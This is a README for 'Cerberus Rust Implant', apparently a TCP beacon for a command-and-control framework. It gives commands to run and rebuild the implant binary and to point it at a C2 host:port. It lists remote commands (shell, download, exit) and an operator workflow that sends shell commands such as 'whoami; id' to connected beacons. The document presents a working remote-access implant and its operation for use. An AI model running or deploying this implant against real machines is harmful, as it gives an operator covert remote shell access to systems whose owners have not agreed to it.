# Cerberus Rust Implant

Minimal TCP beacon for Cerberus C2.

## Binary

Pre-built Linux x86_64 binary: `cerberus-implant` (also copied to project root).

```bash
chmod +x cerberus-implant   # required after copy from some filesystems
CERBERUS_C2=127.0.0.1:8443 ./cerberus-implant
```

## Rebuild

```bash
cd implant
cargo build --release
# → target/release/cerberus-implant
```

## Environment

| Variable         | Default          | Meaning              |
|------------------|------------------|----------------------|
| `CERBERUS_C2`    | `127.0.0.1:8443` | C2 host:port         |
| `CERBERUS_SLEEP` | `5`              | Beacon interval (s)  |

## Protocol

Same as C2 core: 4-byte big-endian length + UTF-8 JSON.

Supported commands: `shell`, `sleep`, `download`, `exit`, `ack`.

## Operator workflow

```bash
# Terminal 1
PYTHONPATH=. python -m cerberus.cli.main run c2_start

# Terminal 2
CERBERUS_C2=127.0.0.1:8443 ./cerberus-implant

# Terminal 1
PYTHONPATH=. python -m cerberus.cli.main run c2_beacons
PYTHONPATH=. python -m cerberus.cli.main run c2_shell --beacon <id> --cmd "whoami; id"
PYTHONPATH=. python -m cerberus.cli.main run c2_results --beacon <id>
```

## v0.1 limits

- Cleartext TCP (AES-GCM next)
- No persistence / injection
- Linux primary target
